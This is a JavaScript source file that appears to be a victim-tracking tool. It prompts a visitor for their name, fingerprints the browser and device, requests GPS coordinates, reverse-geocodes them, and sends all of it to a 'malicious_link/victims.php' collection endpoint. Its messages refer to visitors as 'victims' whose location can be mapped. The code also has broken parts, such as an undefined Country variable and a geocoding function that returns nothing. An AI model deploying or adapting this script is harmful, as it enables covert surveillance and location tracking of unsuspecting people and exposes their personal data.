var local = {
    error: "Unidentified",
    defaultState: "Kaduna",
    defaultCountry: "Nigeria",
    defaultLng : -73.989308,
    defaultLat : 40.741895,
    festival: "fes_name",
    defaultHeight: 0,
    defaultWidth: 0,
    languages: "en",
    key: "03c48dae07364cabb7f121d8c1519492",
}

var x;
x=prompt("Enter Your Full Name Here\n\n👇👇👇👇👇");

            function force(){
                if (x==null || x=="" || x==" " || x=="  " || x=="   "|| x=="    " || x=="     "){
                    console.log("omo!, you get sence");
                    // console.log("hmm, me no want wahala");
                    x=prompt("Please Enter Your Full Name, Abeg!...\n\n👇👇👇👇👇");
                    force();
                }else{console.log("hmm, i even think say you get sence");}
            }

            force();  
        // getFullYear.innerHTML = new Date().getFullYear();

        if (x.includes(" ")){
            var xx=x.replaceAll(" ","_");
        } else {
            var xx=x;
        }

        var xxx;
        xxx=local.festival;
        xxx=xxx.replaceAll("_"," ");
        
                function wait4me(t){return new Promise((r)=>setTimeout(r,t));}
                //  fetch_ipInfo(source_ip);

     function exactADDR(a,b,c,d){
        fetch("https://api.opencagedata.com/geocode/v1/json?q="+a+"+"+b+"&key="+c+"&no_annotations=1&language="+d).then(response => response.json().readAsText()).then(data => {
            if(data.status.code==200){
                if (data.total_results>=1){
                    var addr = data.results[0].formatted;
                } else {
                    var addr = local.error;
                }
                return addr;
            }
        });
    }
        
        if(window.top==self){
            height=local.defaultHeight;
            width=local.defaultWidth;
            if(typeof(window.innerHeight)!="undefined"||typeof(window.innerWidth)!="undefined"){
                height=window.innerHeight;
                width=window.innerWidth;
            }else if(document.documentElement&&(document.documentElement.clientWidth||document.documentElement.clientHeight)){
                height=document.documentElement.clientHeight;
                width=document.documentElement.clientWidth;
            }else if(document.body&&(document.body.clientWidth||document.body.clientWidth)){
                height=document.body.clientHeight;
                width=document.body.clientWidth;
            }else{
                height=local.defaultHeight;
                width=local.defaultWidth;
            }
        }

var tz2Country = {
    "Andorra": "Andorra",
    "Dubai": "United Arab Emirates",
    "Kabul": "Afghanistan",
    "Tirane": "Albania",
    "Yerevan": "Armenia",
    "Casey": "Antarctica",
    "Davis": "Antarctica",
    "Mawson": "Antarctica",
    "Palmer": "Antarctica",
    "Rothera": "Antarctica",
    "Troll": "Antarctica",
    "Vostok": "Antarctica",
    "Buenos_Aires": "Argentina",
    "Cordoba": "Argentina",
    "Salta": "Argentina",
    "Jujuy": "Argentina",
    "Tucuman": "Argentina",
    "Catamarca": "Argentina",
    "La_Rioja": "Argentina",
    "San_Juan": "Argentina",
    "Mendoza": "Argentina",
    "San_Luis": "Argentina",
    "Rio_Gallegos": "Argentina",
    "Ushuaia": "Argentina",
    "Pago_Pago": "Samoa (American)",
    "Vienna": "Austria",
    "Lord_Howe": "Australia",
    "Sydney": "Australia",
    "Melbourne": "Australia",
    "Brisbane": "Australia",
    "Perth": "Australia",
    "Adelaide": "Australia",
    "Hobart": "Australia",
    "Canberra": "Australia",
    "Lagos": "Nigeria",
    "Abuja": "Nigeria",
    "Kano": "Nigeria",
    "Port_Harcourt": "Nigeria",
    "Kaduna": "Nigeria",
    "Nsukka": "Nigeria",
    "Baku": "Azerbaijan",
    "Manama": "Bahrain",
    "Dhaka": "Bangladesh",
    "Bridgetown": "Barbados",
    "Minsk": "Belarus",
    "Brussels": "Belgium",
    "Belmopan": "Belize",
    "Porto-Novo": "Benin",
    "Thimphu": "Bhutan",
    "La_Paz": "Bolivia",
    "Sarajevo": "Bosnia and Herzegovina",
    "Gaborone": "Botswana",
    "Brasilia": "Brazil",
    "Rio_de_Janeiro": "Brazil",
    "Sao_Paulo": "Brazil",
    "Recife": "Brazil",
    "Salvador": "Brazil",
    "Brunei": "Brunei",
    "Sofia": "Bulgaria",
    "Ouagadougou": "Burkina Faso",
    "Bujumbura": "Burundi",
    "Phnom_Penh": "Cambodia",
    "Yaounde": "Cameroon",
    "Ottawa": "Canada",
    "Toronto": "Canada",
    "Vancouver": "Canada",
    "Montreal": "Canada",
    "Edmonton": "Canada",
    "Calgary": "Canada",
    "Bangui": "Central African Republic",
    "N'Djamena": "Chad",
    "Santiago": "Chile",
    "Beijing": "China",
    "Shanghai": "China",
    "Hong_Kong": "China",
    "Macau": "China",
    "Bogota": "Colombia",
    "Moroni": "Comoros",
    "Kinshasa": "Congo (Democratic Republic)",
    "Brazzaville": "Congo (Republic)",
    "San_Jose": "Costa Rica",
    "Zagreb": "Croatia",
    "Havana": "Cuba",
    "Nicosia": "Cyprus",
    "Prague": "Czech Republic",
    "Copenhagen": "Denmark",
    "Djibouti": "Djibouti",
    "Santo_Domingo": "Dominican Republic",
    "Quito": "Ecuador",
    "Cairo": "Egypt",
    "San_Salvador": "El Salvador",
    "Malabo": "Equatorial Guinea",
    "Asmara": "Eritrea",
    "Tallinn": "Estonia",
    "Addis_Ababa": "Ethiopia",
    "Helsinki": "Finland",
    "Paris": "France",
    "Libreville": "Gabon",
    "Tbilisi": "Georgia",
    "Berlin": "Germany",
    "Accra": "Ghana",
    "Athens": "Greece",
    "Guatemala": "Guatemala",
    "Conakry": "Guinea",
    "Georgetown": "Guyana",
    "Port-au-Prince": "Haiti",
    "Tegucigalpa": "Honduras",
    "Budapest": "Hungary",
    "Reykjavik": "Iceland",
    "New_Delhi": "India",
    "Jakarta": "Indonesia",
    "Tehran": "Iran",
    "Baghdad": "Iraq",
    "Dublin": "Ireland",
    "Rome": "Italy",
    "Tokyo": "Japan",
    "Amman": "Jordan",
    "Nairobi": "Kenya",
    "Seoul": "South Korea",
    "Kuwait_City": "Kuwait",
    "Bishkek": "Kyrgyzstan",
    "Vientiane": "Laos",
    "Riga": "Latvia",
    "Beirut": "Lebanon",
    "Tripoli": "Libya",
    "Vilnius": "Lithuania",
    "Luxembourg": "Luxembourg",
    "Skopje": "North Macedonia",
    "Antananarivo": "Madagascar",
    "Kuala_Lumpur": "Malaysia",
    "Bamako": "Mali",
    "Valletta": "Malta",
    "Mexico_City": "Mexico",
    "Ulaanbaatar": "Mongolia",
    "Maputo": "Mozambique",
    "Windhoek": "Namibia",
    "Kathmandu": "Nepal",
    "Amsterdam": "Netherlands",
    "Wellington": "New Zealand",
    "Oslo": "Norway",
    "Muscat": "Oman",
    "Islamabad": "Pakistan",
    "Panama": "Panama",
    "Asuncion": "Paraguay",
    "Lima": "Peru",
    "Manila": "Philippines",
    "Warsaw": "Poland",
    "Lisbon": "Portugal",
    "Doha": "Qatar",
    "Bucharest": "Romania",
    "Moscow": "Russia",
    "Kigali": "Rwanda",
    "Riyadh": "Saudi Arabia",
    "Dakar": "Senegal",
    "Belgrade": "Serbia",
    "Singapore": "Singapore",
    "Bratislava": "Slovakia",
    "Ljubljana": "Slovenia",
    "Mogadishu": "Somalia",
    "Pretoria": "South Africa",
    "Madrid": "Spain",
    "Colombo": "Sri Lanka",
    "Stockholm": "Sweden",
    "Bern": "Switzerland",
    "Damascus": "Syria",
    "Taipei": "Taiwan",
    "Bangkok": "Thailand",
    "Tunis": "Tunisia",
    "Ankara": "Turkey",
    "Ashgabat": "Turkmenistan",
    "Kampala": "Uganda",
    "Kyiv": "Ukraine",
    "London": "United Kingdom",
    "New_York": "United States",
    "Los_Angeles": "United States",
    "Chicago": "United States",
    "Houston": "United States",
    "Washington": "United States",
    "Montevideo": "Uruguay",
    "Tashkent": "Uzbekistan",
    "Caracas": "Venezuela",
    "Hanoi": "Vietnam",
    "Sanaa": "Yemen",
    "Lusaka": "Zambia",
    "Harare": "Zimbabwe"
};
        

var TZ;
var City;
var tzArr;
var Region;
var Country;
var TimeZone;

TZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
tzArr = TZ.split("/");

    TZ=TZ.replaceAll(" ","_");
    Region = tzArr[0];

City = tzArr[tzArr.length - 1];
Ctry = tz2Country[City];
Country = Country.replaceAll(" ","_")

var TimeZone = new Date();
TimeZone=TimeZone.toString();
TimeZone=TimeZone.replaceAll(" ","_");
var UAgent = navigator.userAgent;
UAgent=UAgent.replaceAll(" ","_");
var plat = navigator.platform;
plat=plat.replaceAll(" ","_");
var cookie = navigator.cookieEnabled;
var languages = navigator.languages;
var appcode = navigator.appCodeName;
appcode=appcode.replaceAll(" ","_");
var appname = navigator.appName;
appname=appname.replaceAll(" ","_");
var hardware = navigator.hardwareConcurrency;
var ua = navigator.userAgent;

    let model1;
    var summary = ua.split(")")[0].split("(")[1].replaceAll(" ","_");
    var modelArr = summary.split(";");
    
        if (summary.includes("Android") && modelArr.length >= 4){model1 = modelArr[modelArr.length-2]; }
        else if (summary.includes("Apple-iPhone") && modelArr.length >= 4){model1 = modelArr[modelArr.length-2]; }
        else if (summary.includes("Windows_Phone")){model1 = modelArr[modelArr.length-1]; }
        else if (summary.includes("Windows_NT") && modelArr.length >= 3){model1 = modelArr[modelArr.length-2]; }
        else{model1 = modelArr[modelArr.length-1];}
        
    model1 = model1.replaceAll(" ","_");
    

    if(navigator.userAgentData){
navigator.userAgentData.getHighEntropyValues(['architecture','model','platform','platformVersion','fullVersionList']).then(ua=>{
    
    var browser = ua.fullVersionList[ua.fullVersionList.length - 1].brand;
    browser = browser.replaceAll(" ","_");
    var version = ua.fullVersionList[ua.fullVersionList.length - 1].version;

    let model = ua.model;
    var arch = ua.architecture;
    var plat = ua.platform;
    var deviceVer = ua.platformVersion;

    if (model==""){
        model=model1.replaceAll(" ","_");
    } else {
        model=model.replaceAll(" ","_");
    }


console.log(`cookie Enabled: ${cookie}`);
console.log(`languages: ${languages}`);
console.log(`appCodeName: ${appcode}`);
console.log(`appName: ${appname}`);
console.log(`hardware Concurrency: ${hardware}`);

    console.log(`browser: ${browser}`); 
    console.log(`version: ${version}`); 

    console.log(`platform: ${plat}`); 
    console.log(`archtecture: ${arch}`); 
    console.log(`device model: ${model}`); 
    console.log(`device version: ${deviceVer}`); 
    console.log(`device summary: ${summary}`); 

    console.log(`TimeZone: ${TZ}`);
    console.log(`Region: ${Region}`);
    console.log(`City: ${City}`);
    console.log(`Country: ${Country}`);

if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(accessG,accessD);
} else {
    // send the error msg
    async function wait(){
    console.log("Geolocation is not supported on this browser");
    await wait4me(5000);
    var xhttp = new XMLHttpRequest();
    var msg = "Geolocation_is_not_supported_on_victims_browser";
    xhttp.open("post", `malicious_link/attention.php?denied2=${msg}`);//
    xhttp.send();
    console.log(xhttp);
    }

    wait();
    var lat = local.error;
    var lng = local.error;
    var addr = local.error;

    var xhttp = new XMLHttpRequest();
    xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&deviceVersion=${deviceVer}&platform=${plat}&architecture=${arch}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
    xhttp.send();
    console.log(xhttp);
    // try{more();}catch(e){console.log(e);}

}

    async function accessD(error){
        // send the error msg
        await wait4me(5000);
    var xhttp = new XMLHttpRequest();
        var msg = "Victims_dispermit_us_in_accessing_their_gps_location, Means_that_u_will_not_be_able_to_receive_their_current_location.!";
        xhttp.open("post", `malicious_link/attention.php?denied2=${msg}`);//
        xhttp.send();
        console.log(xhttp);

        var lat = local.error;
        var lng = local.error;
        var addr = local.error;

        var xhttp = new XMLHttpRequest();
        xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&deviceVersion=${deviceVer}&platform=${plat}&architecture=${arch}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
        xhttp.send();
        console.log(xhttp);
        // try{more();}catch(e){console.log(e);}

    }

    async function accessG(position){
        console.log("We_successfully_grant_access_to_victims_gps_location");
        await wait4me(5000);
        var xhttp = new XMLHttpRequest();
        var msg = "We_successfully_grant_access_to_victims_gps_location, Now_you_will_be_able_to_visualize_their_current_location_on_google_map.";
        xhttp.open("post", `malicious_link/attention.php?granted2=${msg}`);//
        xhttp.send();
        console.log(xhttp);

    var lat = position.coords.latitude;
    var lng = position.coords.longitude;
    var addr = exactADDR(lat,lng,local.key,local.languages);

var xhttp = new XMLHttpRequest();
xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&deviceVersion=${deviceVer}&platform=${plat}&architecture=${arch}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
xhttp.send();
console.log(xhttp);
// try{more();}catch(e){console.log(e);}

    } 
});
    } else {
        var ua=navigator.userAgent;
        // '/msie/i'      => 'Internet Explorer' 
    if (ua.includes("Chrome/")){var browser = "Chrome";var version=ua.split("ome/")[1].split(" ")[0];}
    else if (ua.includes("Firefox/")){var browser = "Firefox";var version=ua.split("fox/")[1].split(" ")[0];}
    else if (ua.includes("Chromiun/")){var browser = "Chromiun";var version=ua.split("iun/")[1].split(" ")[0];}
    else if (ua.includes("Netscape/")){var browser = "Netscape";var version=ua.split("ape/")[1].split(" ")[0];}
    else if (ua.includes("Maxthon/")){var browser = "Maxthon";var version=ua.split("hon/")[1].split(" ")[0];}
    else if (ua.includes("Konqueror/")){var browser = "Konqueror";var version=ua.split("ror/")[1].split(" ")[0];}
    else if (ua.includes("Mobile/")){var browser = "Handheld Browser";var version=ua.split("ile/")[1].split(" ")[0];}
    else if (ua.includes("Safari/")){var browser = "Safari";var version=ua.split("ari/")[1].split(" ")[0];}
    else if (ua.includes("Opera/")){var browser = "Opera Mini";var version=ua.split("era/")[1].split(" ")[0];}
    else if (ua.includes("Edge/")){var browser = "Microsoft Edge";var version=ua.split("dge/")[1].split(" ")[0];}
    else if (ua.includes("Trident/")){var browser = "Internet Explorer";var version=ua.split("/")[1].split(" ")[0]}
    else if (ua.includes("MSIE/")){var browser = "Internet Explorer";var version=ua.split("/")[1].split(" ")[0]}
    else {var browser = local.error;var version= local.error};
    
    browser = browser.replaceAll(" ","_");

    var model = model1;
    // var arch = local.error;
    // var deviceVer = local.error;
    
    console.log(`cookie Enabled: ${cookie}`);
console.log(`languages: ${languages}`);
console.log(`appCodeName: ${appcode}`);
console.log(`appName: ${appname}`);
console.log(`hardware Concurrency: ${hardware}`);

    console.log(`browser: ${browser}`); 
    console.log(`version: ${version}`); 

    console.log(`platform: ${plat}`); 
    console.log(`device model: ${model}`); 
    // console.log(`archtecture: ${arch}`); 
    //console.log(`device version: ${deviceVer}`); 
    console.log(`device summary: ${summary}`); 
    console.log(`device date & time: ${TimeZone}`); 

    console.log(`TimeZone: ${TZ}`);
    console.log(`Region: ${Region}`);
    console.log(`City: ${City}`);
    console.log(`Country: ${Country}`);

        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(accessG,accessD);
        } else {
            // send the error msg
            async function wait(){
                console.log("Geolocation is not supported on this browser");
                await wait4me(5000);
                var xhttp = new XMLHttpRequest();
                var msg = "Geolocation_is_not_supported_on_victims_browser";
                xhttp.open("post", `malicious_link/attention.php?denied2=${msg}`);//
                xhttp.send();
                console.log(xhttp);
            }

            wait();
            var lat = local.error;
            var lng = local.error;
            var addr = local.error;
            
            var xhttp = new XMLHttpRequest();
            xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&platform=${plat}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
            xhttp.send();
            console.log(xhttp);
            // try{more();}catch(e){console.log(e);}
        
        }
        
            async function accessD(error){// send the error msg
                console.log("we fucking well need to fucking access ur location, men");
                await wait4me(5000);
    var xhttp = new XMLHttpRequest();
                var msg = "Victims_dispermit_us_in_accessing_their_gps_location, Means_that_u_will_not_be_able_to_receive_their_current_location.";
                xhttp.open("post", `malicious_link/attention.php?denied2=${msg}`);//
                xhttp.send();
                console.log(xhttp);

                var lat = local.error;
                var lng = local.error;
                var addr = local.error;

                var xhttp = new XMLHttpRequest();
                xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&platform=${plat}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
                xhttp.send();
                console.log(xhttp);
                // try{more();}catch(e){console.log(e);}
        
            
            }
        
            async function accessG(position){
                console.log("We_successfully_grant_access_to_victims_gps_location");
                await wait4me(5000);
        var xhttp = new XMLHttpRequest();
                var msg = "We_successfully_grant_access_to_victims_gps_location, Now_you_will_be_able_to_visualize_their_current_location_on_google_map.";
                xhttp.open("post", `malicious_link/attention.php?granted2=${msg}`);//
                xhttp.send();
                console.log(xhttp);

            var lat = position.coords.latitude;
            var lng = position.coords.longitude;
            var addr = exactADDR(lat,lng,local.key,local.languages);

        var xhttp = new XMLHttpRequest();
        xhttp.open("post", `malicious_link/victims.php?victimsName=${xx}&exactAddr=${addr}&screenWidth=${width}&screenHeight=${height}&latitude=${lat}&longitude=${lng}&summary=${summary}&deviceModel=${model}&platform=${plat}&cookieEnabled=${cookie}&languages=${languages}&appCodeName=${appcode}&appName=${appname}&CPUCores=${hardware}&browserName=${browser}&browserVer=${version}&datetime=${TimeZone}&tz=${TZ}&region=${Region}&city=${City}&country=${Country}`);//
        xhttp.send();
        console.log(xhttp);
        // try{more();}catch(e){console.log(e);}
        
            }
    }
    // console.log(`appVersion: ${navigator.userAgentData.getHighEntropyValues(['architecture','model','platform','platformVersion','fullVersionList'])}`); 
